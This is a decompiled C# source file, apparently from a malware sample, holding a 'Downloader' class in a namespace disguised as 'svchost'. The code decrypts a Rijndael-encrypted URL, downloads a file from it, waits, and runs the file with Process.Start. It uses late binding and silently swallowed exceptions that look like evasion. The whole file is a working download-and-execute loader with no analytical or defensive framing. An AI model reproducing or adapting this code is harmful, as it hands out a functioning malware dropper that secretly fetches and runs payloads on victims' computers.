using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace svchost;

public class Downloader
{
	[DebuggerNonUserCode]
	public Downloader()
	{
	}

	public void StartDownlaoder(string DownloadURL, string DownloadPath, string DownloadName, string SleepTimer, string DownloadKey)
	{
		WebClient webClient = new WebClient();
		NewLateBinding.LateCall((object)webClient, (Type)null, "DownloadFile", new object[2]
		{
			RuntimeHelpers.GetObjectValue(RijndaelDecrypt(DownloadURL, Encoding.ASCII.GetString(Convert.FromBase64String(DownloadKey)))),
			Interaction.Environ(DownloadPath) + "\\" + DownloadName
		}, (string[])null, (Type[])null, (bool[])null, true);
		Thread.Sleep(Conversions.ToInteger(SleepTimer));
		Process.Start(Interaction.Environ(DownloadPath) + "\\" + DownloadName);
	}

	public object RijndaelDecrypt(string UDecryptU, string UKeyU)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(UKeyU, salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		try
		{
			byte[] array = Convert.FromBase64String(UDecryptU);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			UDecryptU = Encoding.UTF8.GetString(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return UDecryptU;
	}
}
